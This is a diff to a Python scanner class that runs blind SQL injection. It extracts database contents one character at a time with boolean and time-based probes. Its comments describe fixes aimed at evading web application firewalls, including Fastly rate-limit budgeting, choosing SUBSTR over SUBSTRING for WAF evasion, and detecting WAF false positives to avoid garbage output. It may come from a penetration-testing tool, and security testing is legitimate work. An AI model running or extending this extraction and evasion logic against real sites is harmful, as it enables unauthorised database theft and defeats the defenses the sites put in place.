@@ -60642,17 +60642,28 @@ class Scanner:
                 #   "CASE WHEN CASE WHEN ASCII...BETWEEN 64 THEN sleep END THEN sleep END"
                 # This invalid SQL always returns a fast error → all operators appeared blocked
                 # → bitwise fallback forced even when BETWEEN/gte would work fine.
-                _, ms2 = await _send_payload(_test2)
-                await asyncio.sleep(_delay)
                 _test2f = _atpl.replace("[QUERY]", "SELECT " + _dbms_char_fn_probe).replace("{pos}", "1").replace("{mid}", "200")
-                _, ms2f = await _send_payload(_test2f)
                 if _boolean_oracle:
                     # Boolean oracle: check using _eval (body/status/header diff), not timing.
                     # For fast servers (LAN, localhost, CDN < 30ms), ms2 and ms2f are always
                     # < 30ms regardless of whether the operator works — timing check always fails.
+                    # BUG-PROBE-ALT-BOOLEAN-DOUBLE-REQUEST FIX (MEDIUM): The original code
+                    # called _send_payload(_test2) AND _eval(_test2) for boolean oracle, wasting
+                    # 2 extra HTTP requests per alternative (4 total instead of 2).  With a
+                    # Fastly WAF that rate-limits after N extraction-pattern requests, these
+                    # extra probes consume rate-limit budget before the operator test even
+                    # completes, making the operator appear to work (first 2 probes allowed)
+                    # when the WAF would block it for actual extraction (Nth probe).
+                    # Fix: skip the _send_payload calls entirely for boolean oracle —
+                    # _eval internally calls _send_payload, so no duplicate requests.
                     _r2  = await _eval(_test2)
                     await asyncio.sleep(_delay)
                     _r2f = await _eval(_test2f)
+                else:
+                    _, ms2 = await _send_payload(_test2)
+                    await asyncio.sleep(_delay)
+                    _, ms2f = await _send_payload(_test2f)
+                if _boolean_oracle:
                     if _r2 is True and _r2f is False:
                         # BUG-PROBE-OPERATOR-ENUM-FN-FIX (alternatives): CHAR(122) confirmed
                         # this alternative operator works. Now verify it also works with an
@@ -63923,10 +63934,26 @@ class Scanner:
                     return chr(_val)
                 return None
 
+            # BUG-RC9-EXT-SCANWIDE-FIX: scan-wide flag set when RC9-EXT (or RC9 nonzero
+            # block) detects WAF selectively blocking ordinal-equality probes in the
+            # printable ASCII range.  Once set, all subsequent positions immediately
+            # return None from _fallback_equality instead of running 100+ probes each
+            # time — saving up to 30 minutes of wasted extraction when the WAF uniformly
+            # blocks equality-operator comparisons for every character in the string.
+            # Mutable list so the inner async function can write to it (nonlocal semantics).
+            _waf_eq_range_blocked = [False]
+
             async def _fallback_equality(q, p):
                 """Linear equality scan — only = operator needed.
                 Last resort: O(n) per char but impossible to block without
                 breaking basic SQL equality entirely."""
+                # BUG-RC9-EXT-SCANWIDE-FIX: abort immediately when a prior position
+                # already confirmed WAF is blocking ordinal equality in printable range.
+                # Avoids running 100+ probes per position when we know they will all fail.
+                if _waf_eq_range_blocked[0]:
+                    LOG.debug("[Inference] pos=%d _fallback_equality: scan-wide WAF-eq-range "
+                              "block active — skipping equality scan", p)
+                    return None
                 _ae = {
                     # BUG-FALLBACK-EQ-PG-SUBSTR FIX (WAF EVASION): PostgreSQL family was
                     # using SUBSTRING(q FROM p FOR 1) instead of SUBSTR(q,p,1).  The
@@ -64118,8 +64145,10 @@ class Scanner:
                                 LOG.warning(
                                     "[Inference] pos=%d equality: match val=%d returned True "
                                     "AND WAF-safe complement val=%d ALSO True \u2014 WAF-uniform "
-                                    "blocking confirmed for equality probes; aborting scan.",
+                                    "blocking confirmed for equality probes; aborting scan "
+                                    "(scan-wide).",
                                     p, _val, _complement_val)
+                                _waf_eq_range_blocked[0] = True  # BUG-RC9-EXT-SCANWIDE-FIX
                                 return None
                             # RC8-EXT FIX (CRITICAL): When complement probe returns None,
                             # we cannot distinguish a genuine True match from WAF-uniform blocking.
@@ -64162,7 +64191,8 @@ class Scanner:
                                 LOG.warning(
                                     "[Inference] pos=%d equality: match val=%d True AND "
                                     "ordinal-0 complement ALSO True \u2014 WAF-uniform blocking "
-                                    "(blocks even =0); aborting scan.", p, _val)
+                                    "(blocks even =0); aborting scan (scan-wide).", p, _val)
+                                _waf_eq_range_blocked[0] = True  # BUG-RC9-EXT-SCANWIDE-FIX
                                 return None
                             if _comp0_r is None:
                                 LOG.debug(
@@ -64185,8 +64215,9 @@ class Scanner:
                                     "[Inference] pos=%d equality WAF-nonzero-block: "
                                     "ordinal 0\u2192False but ordinal 1\u2192True. val=%d True was a "
                                     "WAF false positive (WAF blocks nonzero equality probes). "
-                                    "Aborting equality scan to prevent 'aabb' garbage.",
+                                    "Aborting equality scan (scan-wide).",
                                     p, _val)
+                                _waf_eq_range_blocked[0] = True  # BUG-RC9-EXT-SCANWIDE-FIX
                                 return None
                             if _comp1_r is None:
                                 LOG.debug(
@@ -64207,19 +64238,43 @@ class Scanner:
                             # ASCII range (32 = space, 64 = '@') that are NOT the current
                             # candidate _val.  If EITHER returns True, the WAF is blocking
                             # printable ASCII ordinals \u2192 the original True was a WAF FP.
+                            #
+                            # BUG-RC9-EXT-INCLASS FIX (CRITICAL): The original RC9-EXT probes
+                            # (32, 64, 96) are all BELOW lowercase ASCII (97-122).  A WAF that
+                            # selectively blocks ordinals 97-127 (printable letters) while
+                            # passing 0-96 (control chars, punctuation) is NOT detected by
+                            # these probes: ordinals 32 and 64 return False (WAF passes,
+                            # SQL-False) even when ordinal 97 was a WAF false-positive.
+                            # Observed: extracts 'aaaabaaaaaaaabbaaaaaaaaaa' despite RC9-EXT
+                            # \u2014 all positions return 'a'=97 (first scan candidate, WAF-blocked)
+                            # while complements 32/64 return SQL-False (WAF passes those).
+                            # Fix: append _val+1 as an in-class complement.  The adjacent
+                            # ordinal is in the SAME character class as _val; if the WAF
+                            # blocks a range (e.g. 97-122) it also blocks _val+1.
+                            # When _val IS the real char: _val+1 SQL-False \u2192 oracle False \u2192
+                            # RC9-EXT does not fire \u2192 correct return. When WAF blocks the
+                            # range: _val+1 oracle also True \u2192 RC9-EXT fires \u2192 abort.
                             _rc9_ext_probes = [ord_v for ord_v in (32, 64, 96)
                                                if ord_v != _val][:2]
+                            # In-class complement: pick _val+1 (or _val-1 if at ceiling)
+                            # as an additional probe in the same ordinal neighbourhood.
+                            _rc9_inclass = (_val + 1 if _val < 1114111 else _val - 1)
+                            if _rc9_inclass != _val and _rc9_inclass > 0:
+                                _rc9_ext_probes = list(_rc9_ext_probes) + [_rc9_inclass]
                             _rc9_ext_blocked = False
+                            _rc9_r = None  # initialise so the post-loop check is always defined
                             for _rc9_ord in _rc9_ext_probes:
                                 _rc9_r = await _eval(f"({_ae})={_rc9_ord}")
                                 if _rc9_r is True:
                                     LOG.warning(
                                         "[Inference] pos=%d equality RC9-EXT: ordinals 0,1\u2192False "
-                                        "but printable-range ordinal %d\u2192True. WAF selectively "
-                                        "blocks printable ASCII equality probes (32+). val=%d "
-                                        "True was a WAF false positive. Aborting equality scan.",
+                                        "but ordinal %d\u2192True (in-class or printable-range probe). "
+                                        "WAF selectively blocks equality probes in this ordinal "
+                                        "range. val=%d True was a WAF false positive. "
+                                        "Aborting equality scan (scan-wide).",
                                         p, _rc9_ord, _val)
                                     _rc9_ext_blocked = True
+                                    _waf_eq_range_blocked[0] = True  # BUG-RC9-EXT-SCANWIDE-FIX
                                     break
                                 elif _rc9_r is None:
                                     _fe_ambiguous.append(_val)
